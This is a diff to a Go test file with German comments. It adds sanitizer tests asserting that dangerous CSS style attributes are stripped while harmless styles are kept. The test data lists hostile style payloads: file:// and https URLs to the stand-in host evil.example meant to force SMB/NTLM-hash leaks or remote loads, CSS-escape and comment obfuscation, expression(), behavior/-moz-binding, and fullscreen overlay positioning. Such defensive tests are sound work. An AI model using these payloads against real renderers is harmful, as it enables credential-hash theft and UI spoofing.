@@ -213,3 +213,48 @@ func TestSanitizeHTML_EmptyInput(t *testing.T) {
 		t.Errorf("leere Eingabe ergab %q", got)
 	}
 }
+
+// TestSanitizeHTML_StyleWithResourceLoadsRemoved prüft (Security-Review zu Build 41):
+// style-Attribute dürfen keine Ressourcen nachladen (url(), image-set(), @import)
+// – unter Windows löst url(file://server/…) einen SMB-Zugriff aus und kann den
+// NTLM-Hash preisgeben. Auch Verschleierung per CSS-Escape oder Kommentar und
+// UI-Überlagerung per position werden abgewiesen.
+func TestSanitizeHTML_StyleWithResourceLoadsRemoved(t *testing.T) {
+	for _, style := range []string{
+		`background:url(file://evil.example/share/x.png)`,
+		`background-image: URL("https://evil.example/x.png")`,
+		`background:u\72l(file://evil.example/x)`,
+		`background:u/**/rl(x)`,
+		`background-image:image-set("x.png" 1x)`,
+		`@import "https://evil.example/x.css"`,
+		`width:expression(alert(1))`,
+		`behavior:url(x.htc)`,
+		`-moz-binding:url(x.xml#a)`,
+		`position:fixed;top:0;left:0;width:100%;height:100%`,
+		`position: absolute`,
+	} {
+		got := renderer.SanitizeHTML(`<p style="` + strings.ReplaceAll(style, `"`, `&quot;`) + `">x</p>`)
+		if strings.Contains(got, "style=") {
+			t.Errorf("Gefährlicher style-Wert %q wurde übernommen: %s", style, got)
+		}
+		if !strings.Contains(got, "<p>x</p>") {
+			t.Errorf("Element/Text ging verloren bei %q: %s", style, got)
+		}
+	}
+}
+
+// TestSanitizeHTML_SimpleStylesKept prüft, dass harmlose Stile (z. B. aus EPUBs
+// oder LaTeX \textsc) erhalten bleiben.
+func TestSanitizeHTML_SimpleStylesKept(t *testing.T) {
+	for _, style := range []string{
+		`text-align:center`,
+		`font-variant:small-caps`,
+		`margin-left: 2em; font-style: italic`,
+		`color:#333`,
+	} {
+		got := renderer.SanitizeHTML(`<span style="` + style + `">x</span>`)
+		if !strings.Contains(got, `style="`+style+`"`) {
+			t.Errorf("Harmloser Stil %q fehlt: %s", style, got)
+		}
+	}
+}
